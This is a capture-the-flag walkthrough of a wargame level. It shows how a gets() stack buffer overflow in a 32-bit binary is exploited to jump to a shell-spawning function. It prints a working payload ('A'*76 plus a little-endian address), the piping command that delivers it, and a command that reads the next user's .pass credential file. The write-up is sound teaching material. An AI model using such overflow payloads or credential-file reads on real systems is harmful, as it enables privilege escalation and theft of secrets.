## Phase 1: Reconnaissance

Upon logging in as `level1`, we find an executable named `level1` in the home directory

When running the program, it accepts user input and then exits

After providing increasingly large inputs, the program crashes with a seg fault

This strongly suggests a **buffer overflow vulnerability**

To better understand what its doing, we open it with Ghidra

---

## Phase 2: Static Analysis

By loading the binary into **Ghidra**, we observe two important functions

The first one is a function that spawns a shell:
```c
int run(void)
{
    puts("Good... Wait what?");
    system("/bin/sh");
}
```

The second one is the main function:
```c
int main(void)
{
    char s[64];
    gets(s);
}
```
Here, `gets()` reads user input into a buffer of 64 bytes without any safety checks

This introduces a classic stack-based buffer overflow vulnerability

We also find that the `run()` function is never called during normal execution  
So if we manage to overwrite the return address of `main`, we can redirect execution flow to it

---

### Phase 3: Finding the Overflow Offset

To determine how many bytes are needed to overwrite the return address, we provide increasingly large inputs

Using a script, we observe that the program always crashes when the input reaches **76 characters**

---

## Phase 4: Writing the Exploit

From static analysis, we identify the address of the run() function:
```shell
0x08048444
```

Since the binary is 32-bit x86, addresses must be written in little-endian format:

```shell
\x44\x84\x04\x08
```

The final payload structure is:
```text
76 bytes of padding to reach the return address -> The address of run()
``` 

Which gives:
```
"A" * 76 + "\x44\x84\x04\x08"
```

---

## Phase 5: Exploit

We inject the payload into the program and keep standard input open using cat:

```shell
(python2 -c "import os; os.write(1, b'A'*76 + b'\x44\x84\x04\x08')"; cat) | ./level1
```

This overwrites the return address and redirects execution to run()


After this, a shell is spawned with level2 privileges
```shell
whoami
level2
```

---

## Phase 6: Retrieving the Next Password

Now running as level2, we read the password for the next level:
```shell
cat /home/user/level2/.pass
```

This reveals the flag for level2, allowing us to proceed to the next level
